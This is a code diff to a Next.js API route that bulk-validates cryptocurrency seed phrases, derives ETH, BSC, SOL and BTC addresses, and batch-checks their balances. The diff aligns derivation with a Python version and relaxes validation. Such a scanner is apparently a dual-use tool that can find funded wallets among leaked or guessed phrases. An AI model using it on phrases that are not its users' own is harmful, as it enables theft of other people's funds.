@@ -14,9 +14,17 @@ export const dynamic = 'force-dynamic';
 
 function getEthAddress(phrase: string): string | null {
   try {
-    return HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(phrase)).address;
+    // Mismo método que Python: Account.from_mnemonic()
+    // Usa path m/44'/60'/0'/0/0 explícitamente
+    const wallet = HDNodeWallet.fromPhrase(phrase, '', "m/44'/60'/0'/0/0");
+    return wallet.address;
   } catch {
-    return null;
+    try {
+      // Fallback: derivación por defecto
+      return HDNodeWallet.fromMnemonic(Mnemonic.fromPhrase(phrase)).address;
+    } catch {
+      return null;
+    }
   }
 }
 
@@ -238,21 +246,22 @@ export async function POST(req: NextRequest) {
       }
     }
 
-    // Derivar direcciones
-    const validItems: { phrase: string; eth: string; sol: string; btc: string }[] = [];
+    // Derivar direcciones — igual que Python: cada cadena es independiente
+    const validItems: { phrase: string; eth: string | null; sol: string | null; btc: string | null }[] = [];
     for (const phrase of phrasesToScan) {
       if (!bip39.validateMnemonic(phrase)) continue;
       const eth = getEthAddress(phrase);
       const sol = await getSolAddress(phrase);
       const btc = await getBtcAddress(phrase);
-      if (eth && sol && btc) {
+      // Solo se requiere que al menos ETH sea válido (igual que Python)
+      if (eth) {
         validItems.push({ phrase, eth, sol, btc });
       }
     }
 
-    const ethAddrs = [...new Set(validItems.map(v => v.eth))];
-    const solAddrs = validItems.map(v => v.sol);
-    const btcAddrs = validItems.map(v => v.btc);
+    const ethAddrs = [...new Set(validItems.map(v => v.eth).filter(Boolean))] as string[];
+    const solAddrs = [...new Set(validItems.map(v => v.sol).filter(Boolean))] as string[];
+    const btcAddrs = [...new Set(validItems.map(v => v.btc).filter(Boolean))] as string[];
 
     const [ethBals, bscBals, solBals, btcBals] = await Promise.all([
       checkEthBatch(ethAddrs),
@@ -265,17 +274,17 @@ export async function POST(req: NextRequest) {
     const scanned_items: any[] = [];
 
     for (const item of validItems) {
-      const eth_bal = ethBals[item.eth] || 0;
-      const bsc_bal = bscBals[item.eth] || 0;
-      const sol_bal = solBals[item.sol] || 0;
-      const btc_bal = btcBals[item.btc] || 0;
+      const eth_bal = item.eth ? (ethBals[item.eth] || 0) : 0;
+      const bsc_bal = item.eth ? (bscBals[item.eth] || 0) : 0;
+      const sol_bal = item.sol ? (solBals[item.sol] || 0) : 0;
+      const btc_bal = item.btc ? (btcBals[item.btc] || 0) : 0;
 
       const detail = {
         phrase: item.phrase,
-        eth_address: item.eth, eth_balance: eth_bal,
-        bsc_address: item.eth, bsc_balance: bsc_bal,
-        btc_address: item.btc, btc_balance: btc_bal,
-        sol_address: item.sol, sol_balance: sol_bal,
+        eth_address: item.eth,   eth_balance: eth_bal,
+        bsc_address: item.eth,   bsc_balance: bsc_bal,
+        btc_address: item.btc,   btc_balance: btc_bal,
+        sol_address: item.sol,   sol_balance: sol_bal,
       };
       scanned_items.push(detail);
 
